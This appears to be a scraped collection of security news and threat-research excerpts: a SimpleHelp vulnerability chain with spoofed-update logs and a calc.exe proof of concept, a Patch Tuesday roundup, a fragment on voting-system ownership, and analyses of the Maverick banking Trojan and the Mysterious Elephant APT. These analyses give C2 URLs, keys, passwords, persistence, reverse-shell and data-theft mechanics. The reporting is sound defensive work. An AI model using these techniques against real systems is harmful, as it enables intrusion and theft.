“404” error codes because the resources were not found. We will change this later.Inclusion of functionality from untrusted control sphere (CVE-2025-36727)When a user downloads a support or technician binary and runs it, a number of files are downloaded, as we can see from the logs from our python3 server below.Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n<CLIENT-ADDRESS> - - [09/Sep/2025 11:57:50] code 404, message File not found\n<CLIENT-ADDRESS> - - [09/Sep/2025 11:57:50] \"GET /customer/JWrapper-Windows64JRE-version.txt?time=791858819&platform=windows-intel-64&osid=w10-0-22631 HTTP/1.1\" 404 -\n<CLIENT-ADDRESS> - - [09/Sep/2025 11:57:50] code 404, message File not found\n<CLIENT-ADDRESS> - - [09/Sep/2025 11:57:50] \"GET /customer/JWrapper-Windows64JRE-version.txt?time=791858819&platform=windows-intel-64&osid=w10-0-22631 HTTP/1.1\" 404 -\n<CLIENT-ADDRESS> - - [09/Sep/2025 11:57:50] code 404, message File not found\n<CLIENT-ADDRESS> - - [09/Sep/2025 11:57:50] \"GET /customer/JWrapper-Windows64JRE-version.txt?time=791858819&platform=windows-intel-64&osid=w10-0-22631 HTTP/1.1\" 404 -\n<CLIENT-ADDRESS> - - [09/Sep/2025 11:57:52] \"GET /customer/JWrapper-Remote%20Support-version.txt?platform=windows-intel-64&osid=w10-0-22631&guv=00114155471 HTTP/1.1\" 200 -\n<CLIENT-ADDRESS> - - [09/Sep/2025 11:57:53] \"GET /customer/JWrapper-JWrapper-version.txt?platform=windows-intel-64&osid=w10-0-22631&guv=00114155471 HTTP/1.1\" 200 -\n<CLIENT-ADDRESS> - - [09/Sep/2025 11:57:53] \"GET /customer/JWrapper-Remote%20Support-version.txt?platform=windows-intel-64&osid=w10-0-22631&guv=00114155471 HTTP/1.1\" 200 -\n<CLIENT-ADDRESS> - - [09/Sep/2025 11:57:53] \"GET /customer/Remote%20Support-windows64-offline.exe?hostname=http%3A%2F%2F<SERVER-ADDRESS>%3A8000&platform=windows-intel-64&osid=w10-0-22631 HTTP/1.1\" 200 -There did not appear to be any validation that the retrieved files were from a legitimate source, since we were able to spoof all of them.Most notablyRemote Support-windows64-offline.exewas downloaded and executed without any verification.For our proof of concept, we created a custom executable in C that executescalc.exe, put it in the spoofed server’s directory and named itRemote%20Support-windows64-offline.exe.Once the client ran the binary, it loaded our custom executable, executed calc, and displayed our system alert.PoC output on client deviceChained attack: From link to RCEIndividually, each flaw was limited in terms of how an attacker could exploit it. For example, in the case of CVE-2025-36727, an attacker would have to carry out a man-in-the-middle attack to intercept the client-to-server requests, and those requests would also have to be unencrypted.Chained together, they form a viable attack path:Defensive guidanceRecent research fromTenablehighlights how attackers often abuse vulnerabilities in remote-access tools like SimpleHelp and recommends strategies to strengthen defense strategies, including:Maintain an inventory of authorized RMM tools and flag and block unauthorized installations.Audit RMM session activity, review logs for unexpected or abnormal behavior.Monitor network traffic for RMM patterns, installer downloads, unexpected connections or proxy use.Scan the environment to look for listening services that are linked to known RMM tools.Closing thoughtsThis chain demonstrates how two vulnerabilities, which on their own may appear difficult to exploit, can be combined into a viable critical RCE scenario. Attackers rarely rely on a single bug; they often stack different vulnerabilities until they create a path to full system compromise.The Tenable research cited earlier shows that threat actors are actively abusing legitimate RMM tools to persist, escalate privileges and blend into normal IT operations. The flaws discovered in SimpleHelp fit squarely into this trend, giving attackers another way to hijack trust in remote support software.The key takeaway: Security teams and vendors must evaluate not only how issues behave in isolation, but also how they interact and how adversaries exploit trusted tools to achieve their goals.We wish to thank SimpleHelp for acknowledging and responding to our notification of the vulnerabilities and for fixing them.Click here to learn how the Tenable One Exposure Management Platform gives you full visibility across your entire attack surface.",

With ownership over voting systems used in 27 states, this development represents a substantial concentration of control over critical infrastructure related to US elections. The lack of transparency regarding the nature and extent of his involvement with these systems adds an element of uncertainty, particularly given Leiendecker's background in political operations rather than technology or cybersecurity.\n\nThe implications for election security are profound. Such a concentrated ownership could potentially lead to vulnerabilities being exploited by malicious actors aiming to influence electoral outcomes.

      "content": "October Patch Tuesday beats January ’25 record\nMicrosoft throws a farewell party for Win10, Office 2016, and Office 2019… a very big party\nWritten by\nAngela Gunn\nOctober 15, 2025\nThreat Research\nfeatured\nMicrosoft\nPatch Tuesday\nWindows\nWindows 10\nMicrosoft on Tuesday announced 170 patches affecting 21 product families. Eight of the addressed issues are considered by Microsoft to be of Critical severity, and 18 have a CVSS base score of 8.0 or higher. Three are known to be under active exploit in the wild, and two others have been publicly disclosed.\nAt patch time, 12 CVEs are judged more likely to be exploited in the next 30 days by the company’s estimation, in addition to the two already detected to be so. Various of this month’s issues are amenable to direct detection by Sophos protections, and we include information on those in a table below.\nIn addition to the record-breaking patch count (surpassing the total of 159 set in January), there is a substantial set of advisory-only items in this month’s offering. For Edge, there are 14 patches released last week for Chrome that affect Microsoft’s browser. Two more CVEs are submitted by MITRE, including one item (MITRE CVE-2025-54957: Integer overflow in Dolby Digital Plus audio decoder) known to be under exploit in the wild. The Unity Gaming Engine Editor bug that has upended gamers around the world (CVE-2025-59489) touches 30 Microsoft games — though not Xbox consoles, Xbox Cloud Gaming, iOS, or the HoloLens.\nContinuing the list of advisories, a Github-reported bug in Mermaid Diagram Tool affecting Visual Studio (CVE-2025-54132) could potentially be triggered either by a malicious attacker or an AI hallucination. Finally, eight CVEs affecting Azure, Entra, or various flavors of Copilot – all Critical-severity issues involved either elevation of privilege or spoofing – are announced as already patched, though little information about them was made available. We have included titles and CVEs for all of the advisory items in Appendix D.\nWe are as always including at the end of this post additional appendices listing all Microsoft’s patches sorted by severity, by predicted exploitability timeline and CVSS Base score, and by product family. Appendix E provides a breakout of the patches affecting the various Windows Server platforms still in support. This month, we also include a roundup of patches affecting the products leaving support this month, including Windows 10, Office 2016 and 2019, Exchange Server 2016 and 2019, and Visio 2016 and 2019. That information can be found in Appendix F.\nBy the numbers\nTotal CVEs: 170\nPublicly disclosed: 2\nExploit detected: 3\nSeverity\nCritical: 8\nImportant: 161\nModerate: 1\nImpact\nDenial of Service: 11\nElevation of Privilege: 79\nInformation Disclosure: 26\nRemote Code Execution: 31\nSecurity Feature Bypass: 11\nSpoofing: 11\nTampering: 1\nCVSS Base score 9.0 or higher: 3\nCVSS Base score 8.0 or greater: 15\nFigure 1: The sheer volume of the October release is remarkable, but there are just six Critical-severity issues – four Remote Code Execution, two Elevation of Privilege\nProducts\nWindows: 132\n365: 16\nOffice: 16\nExcel: 7\nAzure: 6\nSharePoint: 6\nExchange: 3\nConfiguration Manager: 2\n.NET: 2\nWord: 2\nAccess: 1\nASP.NET: 1\nDefender for Linux: 1\nDynamics 365: 1\nmicrosoft/playwright: 1\nPowerPoint: 1\nPowerShell: 1\nSQL: 1\nVisio: 1\nVisual Studio: 1\nXbox Gaming System: 1\nAs is our custom for this list, CVEs that apply to more than one product family are counted once for each family they affect. We note, by the way, that CVE names don’t always reflect affected product families closely. In particular, some CVEs names in the Office family may mention products that don’t appear in the list of products affected by the CVE, and vice versa.\nFigure 2: If only Windows CVEs were being released this month and nothing else, it would still be the fourth-largest Patch Tuesday in modern history\nNotable October updates\nIn addition to the issues discussed above, a variety of specific items merit attention.\nCVE-2025-24052 — Windows Agere Modem Driver Elevation of Privilege Vulnerability\nCVE-2025-24990 — Windows Agere Modem Driver Elevation of Privilege Vulnerability\nCVE-2025-47979 — Microsoft Failover Cluster Information Disclosure Vulnerability\nCVE-2025-53717 — Windows Virtualization-Based Security (VBS) Enclave Elevation of Privilege Vulnerability\nThis quartet of Important-severity issues all require a bit of extra effort from administrators, and they reward (?) those who diligently keep their systems up to date year after year. The two modem-driver issues – one is already under active exploit, and the other has been publicly disclosed – affect only the specific Agere Modem driver (ltmdm64.sys), which ships natively in Windows, but the issue itself can be exploited via this vulnerability, even if your systems don’t use that soft-modem driver at all. Microsoft is deleting that driver from all versions of Windows as of this month’s updates, putting a quiet, strange end to tech that was cutting-edge (complete with a\nhigh-profile patent lawsuit\n) a generation ago. Meanwhile, Microsoft’s guidance on the Failover Cluster issue indicates that just patching might not be enough; just in case any sensitive information remains residual in system logs, the company advises administrators change their passwords. Finally, patching the VBS issue necessitated changes to various Virtual Secure Mode components; if you previously deployed the relevant policy a number of months ago, Microsoft has\nguidance\nfor redeploying using the new policy.\nCVE-2025-55340 – Windows Remote Desktop Protocol Security Feature Bypass\nCVE-2025-59294 — Windows Taskbar Live Preview Information Disclosure Vulnerability\nIn a month in which the sheer volume of patches is nearly overwhelming, it can be refreshing to look into issues that hint at great ingenuity to find, replicate, and patch. The Important-severity RDP bug could have been far worse, except for the acrobatics necessary to trigger it: 1) The attacker must have access to a user’s machine; 2) the user must initiate an RDP session, and 3) the attack must be carried out within a certain amount of time from the initiation of the RDP session. Meanwhile, in CVE-2025-39294, exploiting the Important-severity Taskbar Live bug would require an attacker to 1) physically get their hands on a machine after its user has 2) hovered over a taskbar preview and then 3) immediately locked the screen or put the device to sleep. Not a bug that’s likely to see widespread abuse, and its CVSS Base score of 2.1 (!) reflects that, but it’s fascinating to think that it was discovered, re-created by the finders and again in Microsoft’s testing facilities, and ultimately fixed.\nCVE-2025-53139 — Windows Hello Security Feature Bypass Vulnerability\nThere’s not a lot of information available on this Important-severity security feature bypass issue in Microsoft biometric authentication tool, but the note that the problem involves “cleartext transmission of sensitive information” by the tool is enough to inspire priority patching… and perhaps a fresh appreciation of something-you-know authentication options.\nCVE-2025-58726 — Windows SMB Server Elevation of Privilege Vulnerability\nIf receiving over fourteen dozen patches in October has you feeling more tricked than treated, perhaps a Halloween ghost story is in order? This Important-severity elevation of privilege issue in SMB Server requires than an SPN (Service Principal Name) that is registered to an account that no longer exists, or is not in use, be available on the target machine. It’s even spookier when you remember that SPNs are of course used in Kerberos authentication… Kerberos, named for the\nthree-headed canine guardian of the underworld\n. And if that’s not scary enough for you, three of this month’s other patches (CVE-2025-58379, CVE-2025-59208, CVE-2025-59295) invoke Internet Explorer, surely one of Microsoft’s most persistent poltergeists.

F: Patches for products ending support in October 2025\nThe following tables list CVEs affecting products for which Microsoft is concluding support this month. Red indicates a Critical-severity issue.\nOfficially, this means that those products will no longer receive security updates, non-security updates, bug fixes, or technical support.

      "summary": "This month's Patch Tuesday release by Microsoft is particularly significant due to the sheer volume of patches released (170) and the high severity ratings assigned to several vulnerabilities, including eight Critical-severity issues. These include Remote Code Execution, Elevation of Privilege, Information Disclosure, and Spoofing flaws that pose a risk across multiple product families such as Windows, Office, Excel, Azure, and more. Notably, two of these Critical issues are already under active exploit in the wild, highlighting the urgent need for immediate action to mitigate potential security breaches. The patches not only address critical vulnerabilities but also include advisories related to products that will no longer receive support this month, emphasizing continuous monitoring and updating across all systems.",

      "url": "https://securelist.com/maverick-banker-distributing-via-whatsapp/117715/",
      "published_date": "2025-10-15",
      "content": "A malware campaign was recently detected in Brazil, distributing a malicious LNK file using WhatsApp. It targets mainly Brazilians and uses Portuguese-named URLs. To evade detection, the command-and-control (C2) server verifies each download to ensure it originates from the malware itself.The whole infection chain is complex and fully fileless, and by the end, it will deliver a new banking Trojan named Maverick, which contains many code overlaps withCoyote. In this blog post, we detail the entire infection chain, encryption algorithm, and its targets, as well as discuss the similarities with known threats.Key findings:A massive campaign disseminated through WhatsApp distributed the new Brazilian banking Trojan named “Maverick” through ZIP files containing a malicious LNK file, which is not blocked on the messaging platform.Once installed, the Trojan uses the open-source project WPPConnect to automate the sending of messages in hijacked accounts via WhatsApp Web, taking advantage of the access to send the malicious message to contacts.The new Trojan features code similarities with another Brazilian banking Trojan calledCoyote; however, we consider Maverick to be a new threat.The Maverick Trojan checks the time zone, language, region, and date and time format on infected machines to ensure the victim is in Brazil; otherwise, the malware will not be installed.The banking Trojan can fully control the infected computer, taking screenshots, monitoring open browsers and websites, installing a keylogger, controlling the mouse, blocking the screen when accessing a banking website, terminating processes, and opening phishing pages in an overlay. It aims to capture banking credentials.Once active, the new Trojan will monitor the victims’ access to 26 Brazilian bank websites, 6 cryptocurrency exchange websites, and 1 payment platform.All infections are modular and performed in memory, with minimal disk activity, using PowerShell, .NET, and shellcode encrypted using Donut.The new Trojan uses AI in the code-writing process, especially in certificate decryption and general code development.Our solutions have blocked 62 thousand infection attempts using the malicious LNK file in the first 10 days of October, only in Brazil.Initial infection vectorThe infection chain works according to the diagram below:The infection begins when the victim receives a malicious .LNK file inside a ZIP archive via a WhatsApp message. The filename can be generic, or it can pretend to be from a bank:The message said,“Visualization allowed only in computers. In case you’re using the Chrome browser, choose “keep file” because it’s a zipped file”.The LNK is encoded to execute cmd.exe with the following arguments:The decoded commands point to the execution of a PowerShell script:The command will contact the C2 to download another PowerShell script. It is important to note that the C2 also validates the “User-Agent” of the HTTP request to ensure that it is coming from the PowerShell command. This is why, without the correct “User-Agent”, the C2 returns an HTTP 401 code.The entry script is used to decode an embedded .NET file, and all of this occurs only in memory. The .NET file is decoded by dividing each byte by a specific value; in the script above, the value is “174”. The PE file is decoded and is then loaded as a .NET assembly within the PowerShell process, making the entire infection fileless, that is, without files on disk.Initial .NET loaderThe initial .NET loader is heavily obfuscated using Control Flow Flattening and indirect function calls, storing them in a large vector of functions and calling them from there. In addition to obfuscation, it also uses random method and variable names to hinder analysis. Nevertheless, after our analysis, we were able to reconstruct (to a certain extent) its main flow, which consists of downloading and decrypting two payloads.The obfuscation does not hide the method’s variable names, which means it is possible to reconstruct the function easily if the same function is reused elsewhere. Most of the functions used in this initial stage are the same ones used in the final stage of the banking Trojan, which is not obfuscated. The sole purpose of this stage is to download two encrypted shellcodes from the C2. To request them, an API exposed by the C2 on the “/api/v1/” routes will be used. The requested URL is as follows:hxxps://sorvetenopote.com/api/v1/3d045ada0df942c983635eTo communicate with its API, it sends the API key in the “X-Request-Headers” field of the HTTP request header. The API key used is calculated locally using the following algorithm:“Base64(HMAC256(Key))”The HMAC is used to sign messages with a specific key; in this case, the threat actor uses it to generate the “API Key” using the HMAC key “MaverickZapBot2025SecretKey12345”. The signed data sent to the C2 is “3d045ada0df942c983635e|1759847631|MaverickBot”, where each segment is separated by “|”. The first segment refers to the specific resource requested (the first encrypted shellcode), the second is the infection’s timestamp, and the last, “MaverickBot”, indicates that this C2 protocol may be used in future campaigns with different variants of this threat. This ensures that tools like “wget” or HTTP downloaders cannot download this stage, only the malware.Upon response, the encrypted shellcode is a loader using Donut. At this point, the initial loader will start and follow two different execution paths: another loader for its WhatsApp infector and the final payload, which we call “MaverickBanker”. Each Donut shellcode embeds a .NET executable. The shellcode is encrypted using a XOR implementation, where the key is stored in the last bytes of the binary returned by the C2. The algorithm to decrypt the shellcode is as follows:Extract the last 4 bytes (int32) from the binary file; this indicates the size of the encryption key.Walk backwards until you reach the beginning of the encryption key (file size – 4 – key_size).Get the XOR key.Apply the XOR to the entire file using the obtained key.WhatsApp infector downloaderAfter the second Donut shellcode is decrypted and started, it will load another downloader using the same obfuscation method as the previous one. It behaves similarly, but this time it will download a PE file instead of a Donut shellcode. This PE file is another .NET assembly that will be loaded into the process as a module.One of the namespaces used by this .NET executable is named “Maverick.StageOne,” which is considered by the attacker to be the first one to be loaded. This download stage is used exclusively to download the WhatsApp infector in the same way as the previous stage. The main difference is that this time, it is not an encrypted Donut shellcode, but another .NET executable—the WhatsApp infector—which will be used to hijack the victim’s account and use it to spam their contacts in order to spread itself.This module, which is also obfuscated, is the WhatsApp infector and represents the final payload in the infection chain. It includes a script fromWPPConnect, an open-source WhatsApp automation project, as well as the Selenium browser executable, used for web automation.The executable’s namespace name is “ZAP”, a very common word in Brazil to refer to WhatsApp. These files use almost the same obfuscation techniques as the previous examples, but the method’s variable names remain in the source code. The main behavior of this stage is to locate the WhatsApp window in the browser and use WPPConnect to instrument it, causing the infected victim to send messages to their contacts and thus spread again. The file sent depends on the “MaverickBot” executable, which will be discussed in the next section.Maverick, the banking TrojanThe Maverick Banker comes from a different execution branch than the WhatsApp infector; it is the result of the second Donut shellcode. There are no additional download steps to execute it. This is the main payload of this campaign and is embedded within another encrypted executable named “Maverick Agent,” which performs extended activities on the machine, such as contacting the C2 and keylogging. It is described in the next section.Upon the initial loading of Maverick Banker, it will attempt to register persistence using the startup folder. At this point, if persistence does not exist, by checking for the existence of a .bat file in the “Startup” directory, it will not only check for the file’s existence but also perform a pattern match to see if the string “for %%” is present, which is part of the initial loading process. If such a file does not exist, it will generate a new “GUID” and remove the first 6 characters. The persistence batch script will then be stored as:“C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\” + “HealthApp-” + GUID + “.bat”.Next, it will generate the bat command using the hardcoded URL, which in this case is:“hxxps://sorvetenopote.com” + “/api/itbi/startup/” + NEW_GUID.In the command generation function, it is possible to see the creation of an entirely new obfuscated PowerShell script.First, it will create a variable named “$URL” and assign it the content passed as a parameter, create a “Net.WebClient” object, and call the “DownloadString.Invoke($URL)” function. Immediately after creating these small commands, it will encode them in base64. In general, the script will create a full obfuscation using functions to automatically and randomly generate blocks in PowerShell. The persistence script reassembles the initial LNK file used to start the infection.This persistence mechanism seems a bit strange at first glance, as it always depends on the C2 being online. However, it is in fact clever, since the malware would not work without the C2. Thus, saving only the bootstrap .bat file ensures that the entire infection remains in memory. If persistence is achieved, it will start its true function, which is mainly to monitor browsers to check if they open banking pages.The browsers running on the machine are checked for possible domains accessed on the victim’s machine to verify the web page visited by the victim. The program will use the current foreground window (window in focus) and its PID; with the PID, it will extract the process name. Monitoring will only continue if the victim is using one of the following browsers:* Chrome* Firefox* MS Edge* Brave* Internet Explorer* Specific bank web browserIf any browser from the list above is running, the malware will use UI Automation to extract the title of the currently open tab and use this information with a predefined list of target online banking sites to determine whether to perform any action on them. The list of target banks is compressed with gzip, encrypted using AES-256, and stored as a base64 string. The AES initialization vector (IV) is stored in the first 16 bytes of the decoded base64 data, and the key is stored in the next 32 bytes. The actual encrypted data begins at offset 48.This encryption mechanism is the same one used byCoyote, a banking Trojan also written in .NET and documented by us in early 2024.If any of these banks are found, the program will decrypt another PE file using the same algorithm described in the.NET Loadersection of this report and will load it as an assembly, calling its entry point with the name of the open bank as an argument. This new PE is called “Maverick.Agent” and contains most of the banking logic for contacting the C2 and extracting data with it.Maverick AgentThe agent is the binary that will do most of the banker’s work; it will first check if it is running on a machine located in Brazil. To do this, it will check the following constraints:What each of them does is:IsValidBrazilianTimezone()Checks if the current time zone is within the Brazilian time zone range. Brazil has time zones between UTC-5 (-300 min) and UTC-2 (-120 min). If the current time zone is within this range, it returns “true”.IsBrazilianLocale()Checks if the current thread’s language or locale is set to Brazilian Portuguese. For example, “pt-BR”, “pt_br”, or any string containing “portuguese” and “brazil”. Returns “true” if the condition is met.IsBrazilianRegion()Checks if the system’s configured region is Brazil. It compares region codes like “BR”, “BRA”, or checks if the region name contains “brazil”. Returns “true” if the region is set to Brazil.IsBrazilianDateFormat()Checks if the short date format follows the Brazilian standard. The Brazilian format is dd/MM/yyyy. The function checks if the pattern starts with “dd/” and contains “/MM/” or “dd/MM”.Right after the check, it will enable appropriate DPI support for the operating system and monitor type, ensuring that images are sharp, fit the correct scale (screen zoom), and work well on multiple monitors with different resolutions. Then, it will check for any running persistence, previously created in “C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\”. If more than one file is found, it will delete the others based on “GetCreationTime” and keep only the most recently created one.C2 communicationCommunication uses the WatsonTCP library with SSL tunnels. It utilizes a local encrypted X509 certificate to protect the communication, which is another similarity to the Coyote malware. The connection is made to the host “casadecampoamazonas.com” on port 443. The certificate is exported as encrypted, and the password used to decrypt it is Maverick2025!. After the certificate is decrypted, the client will connect to the server.For the C2 to work, a specific password must be sent during the first contact. The password used by the agent is “101593a51d9c40fc8ec162d67504e221”. Using this password during the first connection will successfully authenticate the agent with the C2, and it will be ready to receive commands from the operator. The important commands are:CommandDescriptionINFOCLIENTReturns the information of the agent, which is used to identify it on the C2. The information used is described in the next section.RECONNECTDisconnect, sleep for a few seconds, and reconnect again to the C2.REBOOTReboot the machineKILLAPPLICATIONExit the malware processSCREENSHOTTake a screenshot and send it to C2, compressed with gzipKEYLOGGEREnable the keylogger, capture all locally, and send only when the server specifically requests the logsMOUSECLICKDo a mouse click, used for the remote connectionKEYBOARDONECHARPress one char, used for the remote connectionKEYBOARDMULTIPLESCHARSSend multiple characters used for the remote connectionTOOGLEDESKTOPEnable remote connection and send multiple screenshots to the machine when they change (it computes a hash of each screenshot to ensure it is not the same image)TOOGLEINTERNGet a screenshot of a specific windowGENERATEWINDOWLOCKEDLock the screen using one of the banks’ home pages.LISTALLHANDLESOPENEDSSend all open handles to the serverKILLPROCESSKill some process by using its handleCLOSEHANDLEClose a handleMINIMIZEHANDLEMinimize a window using its handleMAXIMIZEHANDLEMaximize a window using its handleGENERATEWINDOWREQUESTGenerate a phishing window asking for the victim’s credentials used by banksCANCELSCREENREQUESTDisable the phishing windowAgent profile infoIn the “INFOCLIENT” command, the information sent to the C2 is as follows:Agent ID:A SHA256 hash of all primary MAC addresses used by all interfacesUsernameHostnameOperating system versionClient version (no value)Number of monitorsHome page (home): “home” indicates which bank’s home screen should be used, sent before the Agent is decrypted by the banking application monitoring routine.Screen resolutionConclusionAccording to our telemetry, all victims were in Brazil, but the Trojan has the potential to spread to other countries, as an infected victim can send it to another location. Even so, the malware is designed to target only Brazilians at the moment.It is evident that this threat is very sophisticated and complex; the entire execution chain is relatively new, but the final payload has many code overlaps and similarities with the Coyote banking Trojan, which we documented in 2024. However, some of the techniques are not exclusive to Coyote and have been observed in other low-profile banking Trojans written in .NET. The agent’s structure is also different from how Coyote operated; it did not use this architecture before.It is very likely that Maverick is a new banking Trojan using shared code from Coyote, which may indicate that the developers of Coyote have completely refactored and rewritten a large part of their components.This is one of the most complex infection chains we have ever detected, designed to load a banking Trojan. It has infected many people in Brazil, and its worm-like nature allows it to spread exponentially by exploiting a very popular instant messenger. The impact is enormous. Furthermore, it demonstrates the use of AI in the code-writing process, specifically in certificate decryption, which may also indicate the involvement of AI in the overall code development. Maverick works like any other banking Trojan, but the worrying aspects are its delivery method and its significant impact.We have detected the entire infection chain since day one, preventing victim infection from the initial LNK file.

      "published_date": "2025-10-15",
      "content": "IntroductionMysterious Elephant is a highly active advanced persistent threat (APT) group that we at Kaspersky GReAT discovered in 2023. It has been consistently evolving and adapting its tactics, techniques, and procedures (TTPs) to stay under the radar. With a primary focus on targeting government entities and foreign affairs sectors in the Asia-Pacific region, the group has been using a range of sophisticated tools and techniques to infiltrate and exfiltrate sensitive information. Notably, Mysterious Elephant has been exploiting WhatsApp communications to steal sensitive data, including documents, pictures, and archive files.The group’s latest campaign, which began in early 2025, reveals a significant shift in their TTPs, with an increased emphasis on using new custom-made tools as well as customized open-source tools, such as BabShell and MemLoader modules, to achieve their objectives. In this report, we will delve into the history of Mysterious Elephant’s attacks, their latest tactics and techniques, and provide a comprehensive understanding of this threat.The emergence of Mysterious ElephantMysterious Elephant is a threat actorwe’ve been tracking since 2023. Initially, its intrusions resembled those of the Confucius threat actor. However, further analysis revealed a more complex picture. We found that Mysterious Elephant’s malware contained code from multiple APT groups, including Origami Elephant, Confucius, and SideWinder, which suggested deep collaboration and resource sharing between teams. Notably, our research indicates that the tools and code borrowed from the aforementioned APT groups were previously used by their original developers, but have since been abandoned or replaced by newer versions. However, Mysterious Elephant has not only adopted these tools, but also continued to maintain, develop, and improve them, incorporating the code into their own operations and creating new, advanced versions. The actor’s early attack chains featured distinctive elements, such as remote template injections and exploitation ofCVE-2017-11882, followed by the use of a downloader called “Vtyrei”, which was previously connected to Origami Elephant and later abandoned by this group. Over time, Mysterious Elephant has continued to upgrade its tools and expanded its operations, eventually earning its designation as a previously unidentified threat actor.Latest campaignThe group’s latest campaign, which was discovered in early 2025, reveals a significant shift in their TTPs. They are now using a combination of exploit kits, phishing emails, and malicious documents to gain initial access to their targets. Once inside, they deploy a range of custom-made and open-source tools to achieve their objectives. In the following sections, we’ll delve into the latest tactics and techniques used by Mysterious Elephant, including their new tools, infrastructure, and victimology.Spear phishingMysterious Elephant has started using spear phishing techniques to gain initial access. Phishing emails are tailored to each victim and are convincingly designed to mimic legitimate correspondence. The primary targets of this APT group are countries in the South Asia (SA) region, particularly Pakistan. Notably, this APT organization shows a strong interest and inclination towards diplomatic institutions, which is reflected in the themes covered by the threat actor’s spear phishing emails, as seen in bait attachments.Spear phishing email used by Mysterious ElephantFor example, the decoy document above concerns Pakistan’s application for a non-permanent seat on the United Nations Security Council for the 2025–2026 term.Malicious toolsMysterious Elephant’s toolkit is a noteworthy aspect of their operations. The group has switched to using a variety of custom-made and open-source tools instead of employing known malware to achieve their objectives.PowerShell scriptsThe threat actor uses PowerShell scripts to execute commands, deploy additional payloads, and establish persistence. These scripts are loaded from C2 servers and often use legitimate system administration tools, such as curl and certutil, to download and execute malicious files.Malicious PowerShell script seen in Mysterious Elephant’s 2025 attacksFor example, the script above is used to download the next-stage payload and save it asping.exe. It then schedules a task to execute the payload and send the results back to the C2 server. The task is set to run automatically in response to changes in the network profile, ensuring persistence on the compromised system. Specifically, it is triggered by network profile-related events (Microsoft-Windows-NetworkProfile/Operational), which can indicate a new network connection. A four-hour delay is configured after the event, likely to help evade detection.BabShellOne of the most recent tools used by Mysterious Elephant is BabShell. This is a reverse shell tool written in C++ that enables attackers to connect to a compromised system. Upon execution, it gathers system information, including username, computer name, and MAC address, to identify the machine. The malware then enters an infinite loop of performing the following steps:It listens for and receives commands from the attacker-controlled C2 server.For each received command, BabShell creates a separate thread to execute it, allowing for concurrent execution of multiple commands.The output of each command is captured and saved to a file namedoutput_[timestamp].txt, where [timestamp] is the current time. This allows the attacker to review the results of the commands.The contents of theoutput_[timestamp].txtfile are then transmitted back to the C2 server, providing the attacker with the outcome of the executed commands and enabling them to take further actions, for instance, deploy a next-stage payload or execute additional malicious instructions.BabShell uses the following commands to execute command-line instructions and additional payloads it receives from the server:Customized open-source toolsOne of the latest modules used by Mysterious Elephant and loaded by BabShell is MemLoader HidenDesk.MemLoader HidenDesk is a reflective PE loader that loads and executes malicious payloads in memory. It uses encryption and compression to evade detection.MemLoader HidenDesk operates in the following manner:The malware checks the number of active processes and terminates itself if there are fewer than 40 processes running — a technique used to evade sandbox analysis.It creates a shortcut to its executable and saves it in the autostart folder, ensuring it can restart itself after a system reboot.The malware then creates a hidden desktop named “MalwareTech_Hidden” and switches to it, providing a covert environment for its activities. This technique is borrowed from an open-source project on GitHub.Using an RC4-like algorithm with the keyD12Q4GXl1SmaZv3hKEzdAhvdBkpWpwcmSpcD, the malware decrypts a block of data from its own binary and executes it in memory as a shellcode. The shellcode’s sole purpose is to load and execute a PE file, specifically a sample of the commercial RAT called “Remcos” (MD5: 037b2f6233ccc82f0c75bf56c47742bb).Another recent loader malware used in the latest campaign is MemLoader Edge.MemLoader Edge is a malicious loader that embeds a sample of the VRat backdoor, utilizing encryption and evasion techniques.It operates in the following manner:The malware performs a network connectivity test by attempting to connect to the legitimate websitebing.com:445, which is likely to fail since the 445 port is not open on the server side. If the test were to succeed, suggesting that the loader is possibly in an emulation or sandbox environment, the malware would drop an embedded picture on the machine and display a popup window with three unresponsive mocked-up buttons, then enter an infinite loop. This is done to complicate detection and analysis.If the connection attempt fails, the malware iterates through a 1016-byte array to find the correct XOR keys for decrypting the embedded PE file in two rounds. The process continues until the decrypted data matches the byte sequence ofMZ\\x90, indicating that the real XOR keys are found within the array.If the malware is unable to find the correct XOR keys, it will display the same picture and popup window as before, followed by a message box containing an error message after the window is closed.Once the PE file is successfully decrypted, it is loaded into memory using reflective loading techniques. The decrypted PE file is based on the open-source RAT vxRat, which is referred to as VRat due to the PDB string found in the sample:C:\\Users\\admin\\source\\repos\\vRat_Client\\Release\\vRat_Client.pdbWhatsApp-specific exfiltration toolsSpying on WhatsApp communications is a key aspect of the exfiltration modules employed by Mysterious Elephant. They are designed to steal sensitive data from compromised systems. The attackers have implemented WhatsApp-specific features into their exfiltration tools, allowing them to target files shared through the WhatsApp application and exfiltrate valuable information, including documents, pictures, archive files, and more. These modules employ various techniques, such as recursive directory traversal, XOR decryption, and Base64 encoding, to evade detection and upload the stolen data to the attackers’ C2 servers.Uplo ExfiltratorThe Uplo Exfiltrator is a data exfiltration tool that targets specific file types and uploads them to the attackers’ C2 servers. It uses a simple XOR decryption to deobfuscate C2 domain paths and employs a recursivedepth-first directory traversal algorithmto identify valuable files. The malware specifically targets file types that are likely to contain potentially sensitive data, including documents, spreadsheets, presentations, archives, certificates, contacts, and images. The targeted file extensions include .TXT, .DOC, .DOCX, .PDF, .XLS, .XLSX, .CSV, .PPT, .PPTX, .ZIP, .RAR, .7Z, .PFX, .VCF, .JPG, .JPEG, and .AXX.Stom ExfiltratorThe Stom Exfiltrator is a commonly used exfiltration tool that recursively searches specific directories, including the “Desktop” and “Downloads” folders, as well as all drives except the C drive, to collect files with predefined extensions. Its latest variant is specifically designed to target files shared through the WhatsApp application. This version uses a hardcoded folder path to locate and exfiltrate such files:%AppData%\\\\Packages\\\\xxxxx.WhatsAppDesktop_[WhatsApp ID]\\\\LocalState\\\\Shared\\\\transfers\\\\The targeted file extensions include .PDF, .DOCX, .TXT, .JPG, .PNG, .ZIP, .RAR, .PPTX, .DOC, .XLS, .XLSX, .PST, and .OST.ChromeStealer ExfiltratorThe ChromeStealer Exfiltrator is another exfiltration tool used by Mysterious Elephant that targets Google Chrome browser data, including cookies, tokens, and other sensitive information. It searches specific directories within the Chrome user data of the most recently used Google Chrome profile, including the IndexedDB directory and the “Local Storage” directory. The malware uploads all files found in these directories to the attacker-controlled C2 server, potentially exposing sensitive data like chat logs, contacts, and authentication tokens. The response from the C2 server suggests that this tool was also after stealing files related to WhatsApp. The ChromeStealer Exfiltrator employs string obfuscation to evade detection.InfrastructureMysterious Elephant’s infrastructure is a network of domains and IP addresses. The group has been using a range of 